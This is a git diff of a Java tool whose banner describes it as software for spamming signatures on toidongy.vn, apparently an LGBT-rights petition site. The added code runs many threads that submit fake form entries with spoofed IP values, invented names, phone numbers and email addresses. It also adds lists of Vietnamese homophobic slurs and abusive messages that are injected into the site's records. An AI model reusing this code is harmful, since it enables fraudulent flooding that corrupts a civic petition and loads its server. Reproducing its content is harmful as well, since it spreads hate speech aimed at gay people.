@@ -4,6 +4,9 @@ import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
+import java.text.NumberFormat;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
 import java.util.Scanner;
 
@@ -14,11 +17,12 @@ public class DitMeToidongy {
 	static int COUNTER = 0;
 	static long STARTED = 0;
 	static int READY = 0;
-	
+	static List<Thread> THREADS = new ArrayList<>();
+
 	public static void main(String args[]) throws Exception {
 		STARTED = System.currentTimeMillis();
 		var scan = new Scanner(System.in);
-		out("\n[BETA v0.1.1] PHAN MEM SPAM CHU KY toidongy.vn CHO LANG GOM TRI DO BALLS\n"
+		out("\n[BETA v0.1.2] PHAN MEM SPAM CHU KY toidongy.vn CHO LANG GOM TRI DO BALLS\n"
 			+ "Author: Nguyen Gia Khanh (GiaKhanhVN)\n"
 			+ "\n* Luu y: so luong Thread la so luong ma JVM\n"
 			+ "se branch ra trong qua trinh spam, neu may tinh\n"
@@ -27,19 +31,26 @@ public class DitMeToidongy {
 			+ "(-) Nhan CTRL + C de thoat khoi phan mem\n"
 		);
 		Signal.handle(new Signal("INT"), new SignalHandler() {
+			@SuppressWarnings("deprecation")
 			public void handle(Signal signal) {
-				out("\n\n[SYS] Da dung may ao Java! Session da gui tong cong " 
-					+ COUNTER + " requests\nThoi gian chay cua session: " + ((System.currentTimeMillis() - STARTED) / 1000D) + "s\nBam X de thoat khoi phan mem!");
-				try {
-					Thread.sleep(60000);
-				} catch (InterruptedException e) {
-					e.printStackTrace();
-				}
-				System.exit(0);
+				out("\n\n[SYS] Dang dung may ao Java! Session da gui tong cong " 
+					+ COUNTER + " requests\nThoi gian chay cua session: " 
+					+ ((System.currentTimeMillis() - STARTED) / 1000D) + "s\nBam Enter de thoat khoi phan mem!");
+				suspendAllThreads();
+				var a = new Scanner(System.in);
+				a.close();
+				Thread.currentThread().stop();
+				return;
 			}
 		});
 		System.out.print("=> Nhap so luong Thread: ");
-		String inp = scan.next();
+		String inp;
+		try {
+			inp = scan.next();
+		} catch (Exception e) {
+			scan.close();
+			return;
+		}
 		scan.close();
 		int soLuongThread = 0;
 		try {
@@ -68,7 +79,7 @@ public class DitMeToidongy {
 			// Khoi dong 1 JVM thread moi
 			final int a = i;
 			final int b = soLuongThread;
-			new Thread(() -> {
+			Thread thr = new Thread(() -> {
 				// Moi 0.1s start 1 thread cho do
 				// stress CPU
 				try {
@@ -88,7 +99,8 @@ public class DitMeToidongy {
 					*/
 					out("[ERROR] Thread #" + Thread.currentThread().getId() + " da xay ra loi! Stack Trace: "
 					+ e.getStackTrace()[0]);
-					out("[SYS] Chuong trinh  lai trong 60s!");
+					out("[SYS] Chuong trinh dung lai trong 60s!");
+					suspendAllThreads();
 					try {
 						Thread.sleep(60000);
 						System.exit(0);
@@ -96,7 +108,9 @@ public class DitMeToidongy {
 						e1.printStackTrace();
 					}
 				}
-			}).start();
+			});
+			THREADS.add(thr);
+			thr.start();
 		}
 		
 	}
@@ -113,9 +127,18 @@ public class DitMeToidongy {
 		var milis = System.currentTimeMillis();
 		// Payload se gui den website (1 payload co ip bat ky)
 		var randIp = DitMeToidongy.randIp();
+		var randName = buildRandName();
+		var randQuote = (random(0,1) == 1) ? randQuote() 
+			: randString(random(20,30));
+		var randPnum = randPhoneNum();
+		var randMail = randMail();
 		// tao 1 cai Payload
-		var payload = "action=updateIpaddress&ipAddress={ip}&note_ido={num}&phone_ido={num}&email_ido={num}%40{num}&username_ido={num}"
+		var payload = "action=updateIpaddress&ipAddress={ip}&note_ido={quo}&phone_ido={pnum}&email_ido={rmai}&username_ido={name}"
 				.replace("{ip}", randIp)
+				.replace("{quo}", randQuote)
+				.replace("{name}", randName)
+				.replace("{pnum}", randPnum)
+				.replace("{rmai}", randMail)
 				.replace("{num}", String.valueOf(new Random().nextInt((99999 - 1000) + 1) + 1000));
 
 		// Open connection bang Java HTTPClient
@@ -136,13 +159,132 @@ public class DitMeToidongy {
 		var res = client.send(request, HttpResponse.BodyHandlers.ofString());
 		COUNTER++;
 		out("[LOG] Thread #" + Thread.currentThread().getId() + " thuc hien xong! Ma Status: " + res.statusCode()
-			+ "\nFake IP da dung: " + randIp + "\nThoi gian thuc hien: " + ((System.currentTimeMillis() - milis) / 1000D) + "s\nThuc hien lan thu: " + COUNTER + "\n");
-		
-		// Tam thoi sleep thread trong 2s cho do bi spam
+			+ "\n[LOG] Fake IP da dung: " + randIp + "\n[LOG] Thoi gian thuc hien: " + ((System.currentTimeMillis() - milis) / 1000D) + "s\n[LOG] Thuc hien lan thu: " + commaify(COUNTER) + "\n"
+			+ "[LOG] Fake Name da dung: " + randName
+			+ "\n[LOG] Quote da gui: " + randQuote
+			+ "\n[LOG] SDT Fake da dung: " + randPnum
+			+ "\n[LOG] Email Fake da dung: " + randMail
+			+ "\n[LOG] Luong Don Da Submit: " + commaify(Long.parseLong(res.body().replace("{", "")
+				.replace("}", "")
+				.replace("\"success\":true,\"data\":\"", "")
+				.replace("\"", ""))) + "\n"
+		);
+		// Tam thoi sleep thread trong 3s cho do bi spam
 		Thread.sleep(3000);
 	}
 
+	// Cac utils cho code gon gang hon
 	static void out(Object a) {
 		System.out.println(a);
+	}
+	
+	private static final NumberFormat COMMA_FORMAT = NumberFormat.getInstance();
+	public static String commaify(double d) {
+		return COMMA_FORMAT.format(d);
+	}
+	
+	public static int random(int min, int max) {
+		if (min < 0) min = 0;
+		if (max < 0) max = 0;
+		return new Random().nextInt((max - min) + 1) + min;
+	}
+	
+	static String randString(int targetStringLength) {
+		int leftLimit = 97;
+		int rightLimit = 122;
+		var random = new Random();
+
+		var generatedString = random.ints(leftLimit, rightLimit + 1)
+			.limit(targetStringLength)
+			.collect(StringBuilder::new, StringBuilder::appendCodePoint, StringBuilder::append)
+			.toString();
+		return generatedString;
+	} 
+	
+	@SuppressWarnings("deprecation")
+	static void suspendAllThreads() {
+		THREADS.forEach(th -> th.stop());
+	}
+	
+	// Cac thuat toan de generate cac thong tin random
+	static String[] randNum = {
+		"032","033","034","037","070","077"
+		,"078","084","085","082","056","058","038",
+		"090", "097", "096", "022"
+	};
+	static String[] randomNamePrefix = {
+		"Lồn", "Cặc", "Buồi", "Rách", "Nổ",
+		"Dái", "Cu", "Ngu", "Cẩu", "Khuyển",
+		"Nguyễn", "Vũ", "Lê", "Trịnh", "Hà",
+		"Hồ", "Vương", "Cà", "Lâu"
+	};
+	static String[] randomNameMiddle = {
+		"Thị", "Tố", "Văn", "Tèo", "Xích",
+		"Hà", "Xiên", "Mẹ", "Thuỳ", "Quốc",
+		"Sinh", "Đài"
+	};
+	static String[] randomNameSuffix = {
+		"Nổ", "Xéo", "Điên", "Sủi", "Dái", 
+		"Cu", "Ngu", "Cẩu", "Khuyển", "Trưởng",
+		"Sơn", "Hồ", "Vương", "Cà", "Linh", "La",
+		"Đài"
+	};
+	static String[] quotes = {
+		"Chúng bay làm loạn lên để đòi quyền duut deet nhau à?",
+		"Mẹ tổ sư bố bọn gay",
+		"Cứ ký đi, đéo ai nghe mày đâu, khóc to lên",
+		"Đã duut deet nhau lại đòi quyền à, bố mày khinh",
+		"Cút hết vào Gulag đi, lũ dị hợm",
+		"Địt mẹ lũ gay",
+		"Mẹ mày béo, à mà mày mô côi",
+		"Thằng mất giống",
+		"Mày được sinh ra bởi xì chây đấy thằng súc vật",
+		"Chắc sau này chúng bay đòi đjt động vật chăng",
+		"Lũ rẻ rách, bố mày khinh",
+		"Địt mẹ lũ quái thai",
+		"May là bố của mày không bị gay nên mày mới được đứng đây đó!",
+		"Gửi thằng đang đọc database: thằng súc vật!",
+		"Lũ đi ngược lại với tiến hoá",
+		"Lũ chim ăn cứt bướm ăn lồn",
+		"Cay cú à?",
+		"Bọn vô lại làm loạn lên để đòi quyền duut deet nhau"
+	};
+	
+	static String[] mailProvider = {
+		"hotmail.ru",
+		"gmail.com",
+		"telegram.ru",
+		"ussr.su",
+		"nazi.ger",
+		"applemail.com",
+		"cummail.com",
+		"the-atlas.",
+		"email.ru",
+		"quickmail.pl"
+	};
+		
+	static String buildRandName() {
+		StringBuilder sb = new StringBuilder(randomNamePrefix[random(0, randomNamePrefix.length - 1)]);
+		sb.append(" ").append(
+			randomNameMiddle[random(0, randomNameMiddle.length - 1)]
+		);
+		sb.append(" ").append(
+			randomNameSuffix[random(0, randomNameSuffix.length - 1)]
+		);
+		return sb.toString();
+	}
+	
+	static String randQuote() {
+		return quotes[random(0, quotes.length - 1)];
+	}
+	
+	static String randPhoneNum() {
+		return randNum[random(0, randNum.length - 1)] 
+			+ random(1, (int) Math.round(Math.pow(10, 7)));
+	}
+	
+	static String randMail() {
+		return randString(random(9,16)) 
+			+ "@" + mailProvider[random(0, mailProvider.length - 1)];
 	}
 }
